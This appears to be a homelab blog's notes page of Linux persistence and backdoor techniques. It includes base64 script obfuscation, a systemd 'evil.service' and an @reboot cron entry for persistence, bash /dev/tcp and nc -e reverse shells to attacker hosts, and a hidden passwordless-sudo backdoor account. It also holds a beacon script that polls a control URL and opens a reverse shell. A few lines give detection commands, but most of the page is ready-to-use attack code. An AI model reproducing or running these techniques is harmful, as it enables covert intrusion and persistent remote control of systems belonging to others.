---
title: AWS 
date: 2023-08-01
tags: [networking,homelab]
---

obsfucation :

origin is the actual script 

```
echo "echo $(base64 origin)" > obsf
chmod +x obsf
```

Running it 
```
sh obsf | base64 -d | sh
```

### Abusing Remote Access Without a Visible Session

`ssh user@host 'sudo apt install backdoor && systemctl enable backdoor'` 

you can catch it from 

`journalctl -u ssh`

### Dropping a systemd service 

Example evil service 

open a reverse shell
```
# /etc/systemd/system/evil.service
[Unit]
Description=Evil Backdoor Service
After=network.target

[Service]
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
```

### cron stuff 

```
@reboot root /usr/bin/evil_payload
```

## Shell stuff

### Reverse shell 

#### how do you find a shell ? 

Use ps to look for shells with no tty 

`ps -eo pid,user,tty,cmd | grep '[b]ash'`

Then check the parent process with 

`pstree -p <PID>`

you can also use 

`ps aux | grep bash`

*** Ussing lsof to see established connections  :- ***

`sudo lsof -i -nP | grep ESTABLISHED`

Start a shell 

```
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```
#### Disable root login

`PermitRootLogin no`

#### starting a reverse shell 

- we need to create an account first that only uses keys

Name it something like *** sysuser *** 

```
sudo adduser backdooruser
sudo usermod -aG sudo backdooruser

sudo visudo
backdooruser ALL=(ALL) NOPASSWD:ALL
```
NOPASSWD helpful for running sudo commands without sudo being prompted 

- setup ssh login 

```
ssh-keygen -t rsa -b 4096

sudo su - backdooruser
mkdir -p ~/.ssh
nano ~/.ssh/authorized_keys 
```

and paste your public key 

expected permissions 

```
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```


- Disable password login

```
sudo nano /etc/ssh/sshd_config
Match User backdooruser
    PasswordAuthentication no
    AuthenticationMethods publickey
``` 

then 

`sudo systemctl restart sshd`


- 2 ways to do a revshell 

```
bash -i >& /dev/tcp/attacker-ip/4242 0>&1
nc ATTACKER_IP 4444 -e /bin/bash
```

prefer to use tcp so that you can disable nc 

```
#!/bin/bash
URL="https://rasenrhino.github.io/static/reverse.html"  # Control server
SHELL_HOST="172.25.0.2"                      # Replace with your attacker's IP
SHELL_PORT=4242 # Port your listener is using
# Loop to check the control server
while true; do
    response=$(curl -s "$URL")
    echo $response
    if [[ "$response" == "yes" ]]; then
        echo "starting revshell"
        bash -i >& /dev/tcp/$SHELL_HOST/$SHELL_PORT 0>&1
    fi
    sleep 5
done
```

to start a python webserver 

```
python3 -m http.server 8080
```